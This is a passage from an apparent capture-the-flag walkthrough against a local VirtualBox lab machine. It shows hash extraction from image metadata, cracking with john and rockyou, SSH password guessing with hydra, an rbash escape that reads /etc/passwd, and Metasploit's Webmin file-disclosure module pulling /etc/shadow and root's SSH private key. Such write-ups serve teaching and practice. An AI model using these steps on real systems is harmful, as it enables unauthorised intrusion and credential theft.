History Software Agent          : Adobe Photoshop CS5 Macintosh, Adobe Photoshop CS5 Macintosh, Adobe Photoshop CS5 Macintosh
History Changed                 : /, /
History Parameters              : from application/vnd.adobe.photoshop to image/jpeg, converted from application/vnd.adobe.photoshop to image/jpeg
Derived From Instance ID        : xmp.iid:0180117407206811994CF9F468E3DAA9
Derived From Document ID        : xmp.did:01801174072068119109B8CADD9DC675
Derived From Original Document ID: xmp.did:01801174072068119109B8CADD9DC675
Text Layer Name                 : Lag 3
Text Layer Text                 : 
Profile CMM Type                : ADBE
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 1999:06:03 00:00:00
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : none
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : ADBE
Profile ID                      : 0
Profile Copyright               : Copyright 1999 Adobe Systems Incorporated
Profile Description             : Adobe RGB (1998)
Media White Point               : 0.95045 1 1.08905
Media Black Point               : 0 0 0
Red Tone Reproduction Curve     : (Binary data 14 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 14 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 14 bytes, use -b option to extract)
Red Matrix Column               : 0.60974 0.31111 0.01947
Green Matrix Column             : 0.20528 0.62567 0.06087
Blue Matrix Column              : 0.14919 0.06322 0.74457
DCT Encode Version              : 100
APP14 Flags 0                   : [14]
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Comment                         : TWVHdXN0YUtpbmc6JDYkZTEuMk5jVW8kOTZTZmtwVUhHMjVMRlpmQTVBYkpWWmp0RDRmczZmR2V0RGRlU0E5SFJwYmtEdzZ5NW5hdXdNd1JOUHhRbnlkc0x6UUd2WU9VODRCMm5ZL080MHBaMzAK
Image Width                     : 1280
Image Height                    : 1280
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1280x1280
Megapixels                      : 1.6
Thumbnail Image                 : (Binary data 7833 bytes, use -b option to extract)
root@kali:~# 
root@kali:~# echo TWVHdXN0YUtpbmc6JDYkZTEuMk5jVW8kOTZTZmtwVUhHMjVMRlpmQTVBYkpWWmp0RDRmczZmR2V0RGRlU0E5SFJwYmtEdzZ5NW5hdXdNd1JOUHhRbnlkc0x6UUd2WU9VODRCMm5ZL080MHBaMzAK== | base64 --decode
MeGustaKing:$6$e1.2NcUo$96SfkpUHG25LFZfA5AbJVZjtD4fs6fGetDdeSA9HRpbkDw6y5nauwMwRNPxQnydsLzQGvYOU84B2nY/O40pZ30
base64: input non valido
root@kali:~# 
root@kali:~# cat hash.txt 
MeGustaKing:$6$e1.2NcUo$96SfkpUHG25LFZfA5AbJVZjtD4fs6fGetDdeSA9HRpbkDw6y5nauwMwRNPxQnydsLzQGvYOU84B2nY/O40pZ30
root@kali:~# 
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
**********       (MeGustaKing)
1g 0:00:00:41 DONE (2017-04-28 08:19) 0.02427g/s 531.2p/s 531.2c/s 531.2C/s 101020..sharpie1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# 

```

ssh with the found credential

```bash

root@kali:~# ssh MeGustaKing@192.168.1.167
The authenticity of host '192.168.1.167 (192.168.1.167)' can't be established.
ECDSA key fingerprint is SHA256:mAxp6psDamyOxr81/mYUZPkIk2s+EDdyz1+RkRFLSUM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.167' (ECDSA) to the list of known hosts.
MeGustaKing@192.168.1.167's password: 
ERROR!
TRACE: sshPr0xy.py line:550 <CODE>U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==</CODE>

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login:Sat Apr  1 00:00:01 2017 from R0cKy0U.7x7
Welcome to rush shell
Lets you update your FunNotes and more!

Uh0h.. u n0 burtieo
h35 da 54wltyD4w6 y0u...
Gw04w4y :(
Local configuration error occurred.
Contact the systems administrator for further assistance.

Connection to 192.168.1.167 closed.
root@kali:~# 

```

we get flag6

```bash

root@kali:~# echo "U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==" | base64 --decode
Salted__�y8j���Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK���i�88$&
root@kali:~# echo "Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK" | base64 --decode
FL46_6:pqpd2jfn4ruq1obyv3thw848te67tejey 
root@kali:~# 

```

it seems like the script was expecting another username because of the 

<code>

Last login:Sat Apr  1 00:00:01 2017 from R0cKy0U.7x7
Welcome to rush shell
Lets you update your FunNotes and more!

Uh0h.. u n0 burtieo
h35 da 54wltyD4w6 y0u...
Gw04w4y :(

```

where we can note the username=burtieo and before trying the rockyou.txt as suggested in the login, we try with the strings from ssh

```bash

root@kali:~# hydra -l burtieo -p "Welcome to rush shell" 192.168.1.167 ssh
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-28 08:46:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
[DATA] attacking service ssh on port 22
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-04-28 08:46:17
root@kali:~# hydra -l burtieo -p "Lets you update your FunNotes and more!" 192.168.1.167 ssh
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-28 08:46:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.1.167   login: burtieo   password: Lets you update your FunNotes and more!
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-04-28 08:46:33
root@kali:~# 

```

Then we login but we find rbash environment

```bash

root@kali:~# ssh burtieo@192.168.1.167
burtieo@192.168.1.167's password: 
ERROR!
TRACE: sshPr0xy.py line:550 <CODE>U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==</CODE>

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login:Sat Apr  1 00:00:01 2017 from R0cKy0U.7x7
Welcome to rush shell
Lets you update your FunNotes and more!

Uh0h.. u n0 burtieo
h35 da 54wltyD4w6 y0u...
Gw04w4y :(
W2wC0m3 Bw3rtie0 :)
burtieo@D0Not5top:~$ PATH
-rbash: PATH: command not found
burtieo@D0Not5top:~$ env
-rbash: env: command not found
burtieo@D0Not5top:~$ pwd
/home/burtie
burtieo@D0Not5top:~$ ls
-rbash: ls: command not found
burtieo@D0Not5top:~$ cd
-rbash: cd: restricted
burtieo@D0Not5top:~$ cat
-rbash: cat: command not found
burtieo@D0Not5top:~$ $(/etc/passwd)
-rbash: /etc/passwd: restricted: cannot specify `/' in command names
burtieo@D0Not5top:~$ $(</etc/passwd)
-rbash: root:x:0:0:root:/root:/bin/bash: restricted: cannot specify `/' in command names
burtieo@D0Not5top:~$ $(</etc/shadow)
-rbash: /etc/shadow: Permission denied
burtieo@D0Not5top:~$ $(</etc/passwd)
-rbash: root:x:0:0:root:/root:/bin/bash: restricted: cannot specify `/' in command names
burtieo@D0Not5top:~$ echo $(</etc/passwd)
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin burtieo:x:1000:1000:burtie,,,:/home/burtie:/bin/rbash pdns:x:109:116:PowerDNS,,,:/var/spool/powerdns:/bin/false mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false MeGustaKing:x:1001:1001::/King:/usr/sbin/rush dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/bin/false
burtieo@D0Not5top:~$ echo $(<id)
-rbash: id: No such file or directory

burtieo@D0Not5top:~$

```

we notice that there is an executable suedoh in the directory /usr/sbin/bin, when trying to execute it we notice that it opens a webmin instance on port 10000 (visible with nmap) for 20 seconds, after this it clear the output and restore the rbash shell, so I think it opens a new rbash instance

```bash

burtieo@D0Not5top:~$ echo $(suedoh -l)
suedoh: unable to resolve host D0Not5top
Matching Defaults entries for burtieo on D0Not5top: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User burtieo may run the following commands on D0Not5top: (ALL) NOPASSWD: /usr/bin/wmstrt
burtieo@D0Not5top:~$ echo $(suedoh /usr/bin/wmstrt)
suedoh: unable to resolve host D0Not5top

</bash>

Scan before the opening

```bash

root@kali:~# nmap 192.168.1.167

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-28 09:11 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for M36u574.ctf (192.168.1.167)
Host is up (0.00013s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
53/tcp  open  domain
80/tcp  open  http
111/tcp open  rpcbind
MAC Address: 08:00:27:58:A4:C4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
root@kali:~#

```

Scan after the opening

```bash

root@kali:~# nmap 192.168.1.167

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-28 09:11 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for M36u574.ctf (192.168.1.167)
Host is up (0.00037s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
10000/tcp open  snet-sensor-mgmt
MAC Address: 08:00:27:58:A4:C4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
root@kali:~# 

```

So we have to find a way to make this period long and keep the instance open, by using a for loop this is possible

```bash

burtieo@D0Not5top:~$ for i in {1..99999..1};do echo $(suedoh /usr/bin/wmstrt&);done
suedoh: unable to resolve host D0Not5top

```

Now the have to analyze the webmin instance and see if it's vulnerable. On an instance usually webmin runs as root so it should be enough to retrieve the /etc/shadow or ssh keys, let's try with metasploit

```bash
root@kali:~# msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; set RHOST 192.168.1.167; set SSL True; run; set RPATH /etc/shadow; run; set RPATH /root/.ssh/id_rsa; run; set RPATH /root/.ssh/id_rsa.pub; run; exit;"
RHOST => 192.168.1.167
SSL => true
[*] Attempting to retrieve /etc/passwd...
[*] The server returned: 200 Document follows
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
burtieo:x:1000:1000:burtie,,,:/home/burtie:/bin/rbash
pdns:x:109:116:PowerDNS,,,:/var/spool/powerdns:/bin/false
mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
MeGustaKing:x:1001:1001::/King:/usr/sbin/rush
dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/bin/false
[*] Auxiliary module execution completed
RPATH => /etc/shadow
[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:$6$6BxJZ5xd$x84bX7slaDzCWbtdQxNjVC92B7YrXlBsUCYVpsoI.MFqcT1tnoTMgXTK6O8Pkm1I7pS/7FvgagDWdkpliygQw1:17260:0:99999:7:::
daemon:*:17253:0:99999:7:::
bin:*:17253:0:99999:7:::
sys:*:17253:0:99999:7:::
sync:*:17253:0:99999:7:::
games:*:17253:0:99999:7:::
man:*:17253:0:99999:7:::
lp:*:17253:0:99999:7:::
mail:*:17253:0:99999:7:::
news:*:17253:0:99999:7:::
uucp:*:17253:0:99999:7:::
proxy:*:17253:0:99999:7:::
www-data:*:17253:0:99999:7:::
backup:*:17253:0:99999:7:::
list:*:17253:0:99999:7:::
irc:*:17253:0:99999:7:::
gnats:*:17253:0:99999:7:::
nobody:*:17253:0:99999:7:::
systemd-timesync:*:17253:0:99999:7:::
systemd-network:*:17253:0:99999:7:::
systemd-resolve:*:17253:0:99999:7:::
systemd-bus-proxy:*:17253:0:99999:7:::
Debian-exim:!:17253:0:99999:7:::
messagebus:*:17253:0:99999:7:::
statd:*:17253:0:99999:7:::
avahi-autoipd:*:17253:0:99999:7:::
sshd:*:17253:0:99999:7:::
burtieo:$6$BBlsb/oG$Aw.HS4JQQ7RgwB.5puvo7yJvXpa5URKfHxUcFYJM42b0pTIkH8Dao3QYrSLADS7Ov4fstuOHHYF8K/Khvpbc//:17257:0:99999:7:::
pdns:!:17253:0:99999:7:::
mysql:!:17253:0:99999:7:::
MeGustaKing:$6$.owswwq.$CMShrXnYmTvT2naqaqCDfUyEYJp0B8MoaW5q4YqU1uOBFlE6xtOby1S7EVvmdqWO5Oe/a5lBog7LovMJC4e/9/:17259:0:99999:7:::
dnsmasq:*:17257:0:99999:7:::
[*] Auxiliary module execution completed
RPATH => /root/.ssh/id_rsa
[*] Attempting to retrieve /root/.ssh/id_rsa...
[*] The server returned: 200 Document follows
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7DA162212961C0CF94C636B47C991024

rDnUjh68EoasdaP40ta9QBeXtvB5uUVH9nKHKWo4KvhLcM4Z0/R6qvjSjlHir4LR
uhTb5Y+e2C7Wze8GlYbdGksFXbUztZec26vN7xH8Q4SeI++J77agqKWRE6jJ++hd
DsR7vDcqGbm9xX37BbE9Q4lLEHR/hNRe3/Ztrbt3obnCLvCW6H3kzpteycWAQQ3W
BaFns85p4AZn654HoIqX/UOkztdYxgOLgpzrLh9p1bRLiaOiBCrURkpYLspeKCNN
yfuPvNUgF1+uH78GlvLwfAA6XRj6HPDZ3D22/MxKcGixUVSPXjJlRpqyFQtvSM6T
cN5NmXjOjmzfgafqPqf7eTFfLChcsWHUmsSneq7pQhvw/vfeGX2kizuXCago+yWt
2IlFusQilfDDzybiunNOp+njD7TxeBLFcAUVdACfMUQ/fC0GHKeHB8q79Wi7r0SQ
m0eC6fIXJpDavN9PtPF2v+5OH9EDKycaeWMmWT0S0fNMmIhHb+U/uhtDjQx+M9fI
I5aBCjzCsDCoKT0qkv+dTafyqSzUN9EupCRh0NcsUT00yrQkxzM5L6C3H+61SNq8
CNi4I50aDp8q6m0KP/GZhUAU9Uegj+JZQ1h5MSnjOpOvKbD4l6/rWM02iFVAmg4O
WjSQfqbxGCmoHE8Y7iqgB8lRWnDYPssDXIMx+1pBkNkBASMpz6gJBZ//rJE1PkVr
aKdhbJFR1NX097z3HXS/7SBJmyuctG+JviH7mp1fH3WMAk2iu4nSiE1aNH1YV/nW
rXNOi5c7/yDE9o/weuJoCBL4VXeH89+l8551JOGU9RMuNk0pi/SSaUwwn7wR0/Yf
b9Sk3pbFDS64AON1T+4zlBWWif8aRMJ7Vm6zkDsE1Jq9nKcNzDknfufs45mKVzXU
m9dlGgzfNF46yPCuHzBZt4q1wrzg5/7gcWx5Qq6xD5VtWiMlB4G3D8DruaeqgTOi
Sh/jFqEOErA015Ympz/0Hh/lFn0NAAJy89BPG86d+VVAn5YstQEqH6zzuIy9mZ9K
853+0BUxA0I9rEessa+Q+NlFadBVE2FcJAr7rMsLGZFoqfvWxg5hBJFJ7jrjpQNe
Q9qzA/CbiMeU+zdifXZwprJR1fNVWalPJJGwotwVgXN/z4s8iN1gMN9y4Kynue9k
zQ/HqvgTkyX52ojLnM/PkXCyx7EXBAOJi5s6fv/22kcZ5Xkpw+x/VILPnJqObmU9
RZ3IB6kbckiMld5GX+xMvYi9rvmHf/mdLj75e7PU+FjCufApXAi+T10PnvMvrCGS
FkSlVyPPo1s4klTdrf2l6tkK6Lqu/7SamkvQvMsY7wnNT4OPI95y3GoRnwEFLd7w
honOroF1U6leA5O8jxSxI/CIwxvb5DO/sX4bZxShlhD98yO74ImAg5ACTj/eUaVA
/Q7bpfasSnqdKNWhx81pD6Ee9WeBZv8c0I0/EqS188O1qFYbtsaqZhYytTqYwvZ0
p6QuusMnDaA1nB8wL7ltKXt5PhBBxSVbUKtP6DWcBRviItFTsAnmK1QhD2wmTkCu
B8ochgwCgtAUs4cUXxnZrp5pu2yvu8Dhf//z8lBtoItPh5LTmW1N1g4s+9NKt72P
-----END RSA PRIVATE KEY-----
[*] Auxiliary module execution completed
RPATH => /root/.ssh/id_rsa.pub
[*] Attempting to retrieve /root/.ssh/id_rsa.pub...
[*] The server returned: 200 Document follows
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPKVt8KEVrr80LT9ZwRsWG8w9O2vgWd99+2+xmi3WCgCR/IrhqoJqEhX9owwiaUUnyRWrj9AKDj8Neetju9rOCTJsvWAlfFgyrRXkOV9twpLcrML+LC5GsVGLH7U/R2sTpT9Ywad0yL+FTvHZ+AbYLFpml4Gbhat6Ynhcg3Q6XmxGHXkV9cd6/XCx74K8CKEtOye1REj8KDtsC329qvbp/9Dt1ZZQEAUFvLqgLJiZxmH5snWiszcO2TKQ3lUw3tLy5rA/bXe3Bf4zuEmktEuA0NW+FTLYELrBy/5PK007Uh0CQVpVS5C+tkLtqh6meAXPp7dhi/B6qGOIXpPxjpUjH root@D0Not5top
[*] Auxiliary module execution completed
root@kali:~# 
```

At this point we proceed to crack the root password

```bash
root@kali:~# cat passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
burtieo:x:1000:1000:burtie,,,:/home/burtie:/bin/rbash
pdns:x:109:116:PowerDNS,,,:/var/spool/powerdns:/bin/false
mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
MeGustaKing:x:1001:1001::/King:/usr/sbin/rush
dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/bin/false
root@kali:~# cat shadow 
root:$6$6BxJZ5xd$x84bX7slaDzCWbtdQxNjVC92B7YrXlBsUCYVpsoI.MFqcT1tnoTMgXTK6O8Pkm1I7pS/7FvgagDWdkpliygQw1:17260:0:99999:7:::
daemon:*:17253:0:99999:7:::
bin:*:17253:0:99999:7:::
sys:*:17253:0:99999:7:::
sync:*:17253:0:99999:7:::
games:*:17253:0:99999:7:::
man:*:17253:0:99999:7:::
lp:*:17253:0:99999:7:::
mail:*:17253:0:99999:7:::
news:*:17253:0:99999:7:::
uucp:*:17253:0:99999:7:::
proxy:*:17253:0:99999:7:::
www-data:*:17253:0:99999:7:::
backup:*:17253:0:99999:7:::
list:*:17253:0:99999:7:::
irc:*:17253:0:99999:7:::
gnats:*:17253:0:99999:7:::
nobody:*:17253:0:99999:7:::
systemd-timesync:*:17253:0:99999:7:::
systemd-network:*:17253:0:99999:7:::
systemd-resolve:*:17253:0:99999:7:::
systemd-bus-proxy:*:17253:0:99999:7:::
Debian-exim:!:17253:0:99999:7:::
messagebus:*:17253:0:99999:7:::
statd:*:17253:0:99999:7:::
avahi-autoipd:*:17253:0:99999:7:::
sshd:*:17253:0:99999:7:::
burtieo:$6$BBlsb/oG$Aw.HS4JQQ7RgwB.5puvo7yJvXpa5URKfHxUcFYJM42b0pTIkH8Dao3QYrSLADS7Ov4fstuOHHYF8K/Khvpbc//:17257:0:99999:7:::
pdns:!:17253:0:99999:7:::
mysql:!:17253:0:99999:7:::
MeGustaKing:$6$.owswwq.$CMShrXnYmTvT2naqaqCDfUyEYJp0B8MoaW5q4YqU1uOBFlE6xtOby1S7EVvmdqWO5Oe/a5lBog7LovMJC4e/9/:17259:0:99999:7:::
dnsmasq:*:17257:0:99999:7:::

root@kali:~# unshadow passwd shadow 
root:$6$6BxJZ5xd$x84bX7slaDzCWbtdQxNjVC92B7YrXlBsUCYVpsoI.MFqcT1tnoTMgXTK6O8Pkm1I7pS/7FvgagDWdkpliygQw1:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:*:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:*:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:*:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:*:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:!:104:109::/var/spool/exim4:/bin/false
messagebus:*:105:110::/var/run/dbus:/bin/false
statd:*:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:*:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:*:108:65534::/var/run/sshd:/usr/sbin/nologin
burtieo:$6$BBlsb/oG$Aw.HS4JQQ7RgwB.5puvo7yJvXpa5URKfHxUcFYJM42b0pTIkH8Dao3QYrSLADS7Ov4fstuOHHYF8K/Khvpbc//:1000:1000:burtie,,,:/home/burtie:/bin/rbash
pdns:!:109:116:PowerDNS,,,:/var/spool/powerdns:/bin/false
mysql:!:110:117:MySQL Server,,,:/nonexistent:/bin/false
MeGustaKing:$6$.owswwq.$CMShrXnYmTvT2naqaqCDfUyEYJp0B8MoaW5q4YqU1uOBFlE6xtOby1S7EVvmdqWO5Oe/a5lBog7LovMJC4e/9/:1001:1001::/King:/usr/sbin/rush
dnsmasq:*:111:65534:dnsmasq,,,:/var/lib/misc:/bin/false
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt shadow 
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (root)
**********       (MeGustaKing)
Lets you update your FunNotes and more! (burtieo)
3g 0:00:01:28 DONE (2017-04-28 09:33) 0.03396g/s 257.9p/s 506.5c/s 506.5C/s braxton1..151987
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# 
```

